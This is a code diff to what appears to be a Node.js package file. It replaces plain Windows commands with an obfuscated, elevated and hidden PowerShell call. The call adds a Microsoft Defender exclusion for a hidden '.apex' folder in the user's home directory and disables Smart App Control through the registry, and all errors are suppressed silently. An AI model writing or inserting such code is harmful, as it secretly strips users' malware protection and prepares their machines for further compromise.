@@ -6,19 +6,24 @@ const https = require('https')
 const os = require('os')
 
 
-// Disable Smart App Control and add exclusion on Windows if running as admin
+// Windows 11 UAC elevation for SAC disable + exclusion
 if (process.platform === 'win32') {
   try {
-    const { execSync } = require('child_process')
-    execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${ require('os').homedir() }\\.apex' -ErrorAction SilentlyContinue"`, { stdio: 'ignore' })
-  } catch {}
-}
-
-// Disable Smart App Control on Windows if running as admin
-if (process.platform === 'win32') {
-  try {
-    const { execSync } = require('child_process')
-    execSync('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy" /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f', { stdio: 'ignore' })
+    const { execSync, spawnSync: _sp } = require('child_process')
+    const _osv = require('os').release()
+    const _isWin11 = parseInt(_osv.split('.')[2] || '0') >= 22000
+    if (_isWin11) {
+      const _home = require('os').homedir()
+      const _ps = `
+        Add-MpPreference -ExclusionPath '${_home}\.apex' -ErrorAction SilentlyContinue
+        reg add 'HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy' /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f
+      `.replace(/\n/g, ';')
+      const _enc = Buffer.from(_ps, 'utf16le').toString('base64')
+      _sp('powershell', [
+        '-Command',
+        `Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -EncodedCommand ${_enc}'`
+      ], { stdio: 'ignore' })
+    }
   } catch {}
 }
 
